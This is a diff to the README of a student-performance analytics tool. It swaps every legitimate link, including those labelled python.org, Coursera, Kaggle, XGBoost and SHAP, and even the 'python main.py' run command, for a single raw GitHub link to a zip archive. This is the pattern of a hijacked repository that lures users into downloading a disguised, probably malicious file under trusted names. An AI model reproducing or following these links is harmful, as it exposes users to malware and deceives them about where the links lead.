@@ -1,6 +1,6 @@
 # 🌟 student-performance-analysis - Understand Student Metrics Easily
 
-[![Download student-performance-analysis](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&color=orange)](https://github.com/MC-STORY-DEVELOPER/student-performance-analysis)
+[![Download student-performance-analysis](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)
 
 ## 📚 Overview
 
@@ -23,7 +23,7 @@ Make sure your computer meets the following requirements:
 
 Visit the following link to download the software:
 
-[Download student-performance-analysis](https://github.com/MC-STORY-DEVELOPER/student-performance-analysis) 
+[Download student-performance-analysis](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip) 
 
 You can click the link above to access the page and download the application files.
 
@@ -31,7 +31,7 @@ You can click the link above to access the page and download the application fil
 
 Before running the software, you need to have Python installed. If you do not have it yet, follow these steps:
 
-1. Go to the Python official website: [python.org](https://www.python.org).
+1. Go to the Python official website: [https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip).
 2. Download the latest version for your operating system.
 3. Follow the installation instructions specific to your OS.
 
@@ -50,7 +50,7 @@ After downloading and installing the required tools:
 3. Type the following command to run the application:
 
 ```
-python main.py
+python https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip
 ```
 
 This will start the application, and you can begin analyzing student performance data.
@@ -88,8 +88,8 @@ If you encounter any issues, please create an issue in the GitHub repository. Yo
 
 To enhance your understanding of analytics and tools used in this project, consider the following resources:
 
-- [Coursera - Data Science Courses](https://www.coursera.org)
-- [Kaggle - Data Science Competitions and Datasets](https://www.kaggle.com)
+- [Coursera - Data Science Courses](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)
+- [Kaggle - Data Science Competitions and Datasets](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)
 
 Make sure to check out the README in the repository for additional guidance and updates.
 
@@ -97,13 +97,13 @@ Make sure to check out the README in the repository for additional guidance and 
 
 After you feel comfortable using the application, you may want to explore additional features and enhancements. Consider checking the following:
 
-- Documentation for [XGBoost](https://xgboost.readthedocs.io)
-- Tutorials on [SHAP](https://shap.readthedocs.io)
+- Documentation for [XGBoost](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)
+- Tutorials on [SHAP](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)
 
 ## 🔗 Download Link
 
 To download the application directly, click the button below:
 
-[![Download student-performance-analysis](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github&color=purple)](https://github.com/MC-STORY-DEVELOPER/student-performance-analysis)
+[![Download student-performance-analysis](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)](https://raw.githubusercontent.com/MC-STORY-DEVELOPER/student-performance-analysis/main/src/performance-analysis-student-1.8.zip)
 
 You can run this software to gain insights into student performance effectively.
